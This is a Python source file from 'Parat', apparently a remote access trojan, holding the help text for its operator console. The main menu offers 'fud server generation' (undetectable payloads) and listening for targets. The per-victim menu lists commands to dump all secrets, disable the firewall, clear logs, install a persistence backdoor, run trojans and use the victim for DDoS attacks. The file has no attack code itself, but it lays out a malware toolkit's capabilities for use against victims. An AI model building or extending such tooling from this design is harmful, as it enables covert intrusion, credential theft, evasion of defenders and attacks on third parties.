#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from lib.ParatPrint import pprint


class GenHelp:

    @staticmethod
    def genshow(self):

        return """
   \033[1;34mName          Current Setting\033[1;m
   ----          ---------------
   platform      {:<17}
   arch          {:<17}
   host          {:<17}
   port          {:<17}
   output        {:<17}
   scriptlet     {:<17}
   path          {:<17}\n"""



class LoopsHelp:

    @staticmethod
    def in_main(self):

        pprint("""
    Command                    Description
    =======                    ========================
    !                          run commands by id(history_id)
    help                       show this message
    banner                     show parat banner
    clear                      clear the terminal
    history                    show command history
    cd                         change directory
    pwd                        echo current directory
    nano                       use nano editor in parat
    python                     interactive shell(debuging purposes)
    config                     edit config file manually
    bash                       get your bash shell
    listen                     start listen for target
    generate                   fud server generation
    sessions                   control connected targets
    settings                   control parat settings
    author                     about parat develepoer
    version                    show current version
    exit                       fully go out parat shell
    off                        exit and fully shutdown machine\n
""")


    @staticmethod
    def in_controller(self):

        pprint("""
    Command                       Description
    =======                       ==============================
    help                          show this message and exit
    clear                         clear the terminal
    continue                      use if results are tumble
    background                    keep target and go to main menu
    tree                          show current directory tree
    cd                            change directory
    pwd                           show current directory on target
    touch                         make new file
    mkdir                         make new directory
    rmv                           remove file or directory
    active_window                 get last clicked window information
    datime                        time from last activate
    msgbox                        show message box
    sysinfo                       get system information
    drives                        list user partitions
    dump                          find all secrets on target!
    pzip                          unzip a '.zip' file
    shell                         get shell for cmd command
    scan                          scan top 25 ports on a single host
    wget                          download file 'from url to target' machine
    explorer                      open website using internet explorer
    download                      download file from target machine
    upload                        upload file to target machine
    screenshot                    take screenshot target desktop
    uninstall                     remove installed program
    getps                         get process list
    kill                          kill a process with PID
    runfile                       run trojan on target (remote/local support)
    firewall                      disable target firewall
    rmlog                         clen all logs(may take few time at first time)
    desktop                       active remote desktop protocol
    backdoor                      apply persistence mechanism
    dos                           use target for ddos attacks
    shutdown                      shutdown target machine and close connection
    reboot                        restart target machine and close connection
    switch                        control another session
    disconnect                    cut target connection
    remove                        disconnect + delete executed file\n
""")
